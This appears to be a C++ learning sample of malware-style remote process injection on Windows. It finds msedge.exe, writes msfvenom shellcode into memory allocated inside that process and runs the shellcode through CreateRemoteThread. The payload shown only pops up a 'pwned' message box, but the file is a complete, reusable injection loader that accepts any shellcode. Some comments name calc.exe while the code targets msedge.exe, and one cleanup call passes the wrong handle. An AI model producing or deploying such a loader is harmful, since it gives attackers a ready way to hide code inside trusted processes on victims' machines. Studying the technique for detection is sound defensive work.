#include <Windows.h> /* Header file that acts as a wrapper for everything included in the Windows API */
#include <stdio.h> /* Header file for file I/O ops (e.g. print strings or R/W to console) */
#include <TlHelp32.h> /* Process "snapshot" -- Takes a snapshot of the specified processes, 
as well as the heaps, modules, and threads used by these processes.*/

/* Process injection technique for malware -- be sure to compile for the same
architecture for the process you're injecting into (x86/x64)! */

/* Process Injection Technique -- Very similar to self-injection
	1. Obtain a handle to the target process
	2. Allocate memory
	3. Write shellcode
	4. Execute shellcode */

int main(int argc, char** argv) {

	/* Created shellcode via MSFVenom on Kali Linux.
	Command: msfvenom -p windows/x64/messagebox TEXT="Xyco's Process Injection Technique for Malware" TITLE="pwned" -f c -a x64 */
	unsigned char buf[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
		"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
		"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
		"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
		"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
		"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
		"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
		"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
		"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
		"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
		"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
		"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
		"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
		"\x4c\x8d\x85\x2d\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
		"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
		"\xd5\x58\x79\x63\x6f\x27\x73\x20\x50\x72\x6f\x63\x65\x73"
		"\x73\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x20\x54\x65"
		"\x63\x68\x6e\x69\x71\x75\x65\x20\x66\x6f\x72\x20\x4d\x61"
		"\x6c\x77\x61\x72\x65\x00\x70\x77\x6e\x65\x64\x00";

	/* Define struct to store our "snapshot" of all of our PID's in memory --
	Remember: a struct is a "container" that can be used to hold different types of data together
	This is not included in the Windows header, but is included within the WinAPI. Need to include: TlHelp32.h. */
	PROCESSENTRY32 pe32{};

	/* Set the size to represent the entire size of the struct */
	pe32.dwSize = sizeof(PROCESSENTRY32);

	/* Take a "snapshot" of all running processes in memory. */
	HANDLE pidSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	Process32First(pidSnapshot, &pe32);

	/* Loop through the "snapshot" until we find 'calc.exe'. */
	do {
		/* Convert to long string due to UTF-16 encoding
		szExeFile is a wide string and cannot be directly compared to a normal string. */
		if (wcscmp((const wchar_t*)pe32.szExeFile, L"msedge.exe") == 0) {

			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

			LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

			if (allocated_mem == NULL) {

				printf("Memory allocation failed: %ul\n", GetLastError());

				return 1;
			}

			printf("Memory page has been allocated at: 0x%p\n", allocated_mem);

			/* Write shellcode into allocated memory */
			WriteProcessMemory(hProcess, allocated_mem, buf, sizeof(buf), NULL);

			/* Execute injected shellcode (buf) */
			HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

			if (hThread == NULL) {

				printf("Failed to obtain process handle: %ul\n", GetLastError());

				return 1;

			}

			/* Halt execution of program until the thread returns */
			WaitForSingleObject(hThread, INFINITE);

			/* Free the allocated memory in calc.exe */
			VirtualFreeEx(hThread, allocated_mem, 0, MEM_RELEASE);

			/* Close handle to thread */
			CloseHandle(hThread);

			/* Close handle to process */
			CloseHandle(hProcess);

			/* Break out of our loop */
			break;
		}

	} while (Process32Next(pidSnapshot, &pe32));

	return 0;

}